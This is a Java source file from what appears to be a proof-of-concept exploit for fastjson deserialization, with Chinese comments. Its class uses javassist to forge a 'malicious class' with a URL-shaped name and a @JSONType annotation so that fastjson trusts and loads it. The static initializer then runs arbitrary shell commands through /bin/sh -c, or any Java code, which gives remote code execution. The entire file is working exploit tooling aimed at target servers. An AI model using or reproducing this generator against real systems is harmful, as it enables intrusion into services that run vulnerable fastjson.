package PoC_1283;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewConstructor;
import javassist.bytecode.AnnotationsAttribute;
import javassist.bytecode.ConstPool;
import javassist.bytecode.annotation.Annotation;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * 共享核心（javassist 版）：生成"恶意类"字节码。
 *
 * static 逻辑直接用 Java 源码字符串表达（clinitBody），
 * 想改 RCE 逻辑 / 加任何代码，只需改这段字符串，可读性、可维护性高很多。
 *
 * 生成结果：
 *   - 类名（this_class）= 任意 internal name（jar:http://... / jar:file:/proc/self/fd/N!/...）
 *   - 带 @com.alibaba.fastjson.annotation.JSONType 注解（触发 fastjson 信任路径）
 *   - <clinit> = clinitBody（Java 源码），JVM 首次加载时执行 → RCE
 */
public class JavassistGen {

    /**
     * 生成"执行系统命令"的 Java 语句。
     * 默认用 /bin/sh -c（Linux）；Windows 靶机请自行改为 cmd.exe /c。
     * 命令中的反斜杠和双引号会被转义，避免破坏生成的 Java 代码。
     */
    public static String execCmd(String cmd) {
        String escaped = cmd.replace("\\", "\\\\").replace("\"", "\\\"");
        return "Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"});";
    }

    /**
     * 用 try-catch 包裹代码，兜底 Throwable（含 Error），避免 <clinit> 抛异常导致类加载失败。
     */
    public static String guarded(String code) {
        return "try { " + code + " } catch (Throwable t) {}";
    }

    /**
     * 根据三种输入模式解析出最终的 static{} 方法体。
     *
     * @param mode  "cmd" | "code" | "code-file"
     * @param value 命令 / Java 代码 / 代码文件路径
     */
    public static String resolveBody(String mode, String value) throws IOException {
        String code;
        switch (mode) {
            case "cmd":
                code = execCmd(value);
                break;
            case "code":
                code = value;
                break;
            case "code-file":
                code = new String(Files.readAllBytes(Paths.get(value)), StandardCharsets.UTF_8);
                break;
            default:
                throw new IllegalArgumentException("unknown mode: " + mode);
        }
        return guarded(code);
    }

    /**
     * 生成恶意类的字节码。
     *
     * @param internalName 类的 internal name（/ 分隔，如 jar:file:/proc/self/fd/36!/E36）
     * @param clinitBody   static{} 的方法体（Java 源码），可任意自定义
     * @return 类的字节码
     */
    public static byte[] generate(String internalName, String clinitBody) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        // 预导入常用包，用户代码可用简单类名（File/URL/List...）
        pool.importPackage("java.io");
        pool.importPackage("java.net");
        pool.importPackage("java.util");

        // javassist 不接受非法类名 makeClass，先以合法名创建，再改名为目标 internal name
        CtClass cc = pool.makeClass("X");
        cc.setName(internalName);

        // 加 @JSONType 注解（RuntimeVisibleAnnotations）
        ConstPool cpool = cc.getClassFile().getConstPool();
        Annotation ann = new Annotation("com.alibaba.fastjson.annotation.JSONType", cpool);
        AnnotationsAttribute attr = new AnnotationsAttribute(cpool, AnnotationsAttribute.visibleTag);
        attr.addAnnotation(ann);
        cc.getClassFile().addAttribute(attr);

        // 默认构造器（fastjson 实例化需要）
        cc.addConstructor(CtNewConstructor.defaultConstructor(cc));

        // static 块：写 Java 源码字符串
        cc.makeClassInitializer().setBody(clinitBody);

        byte[] bytes = cc.toBytecode();
        cc.detach();
        return bytes;
    }
}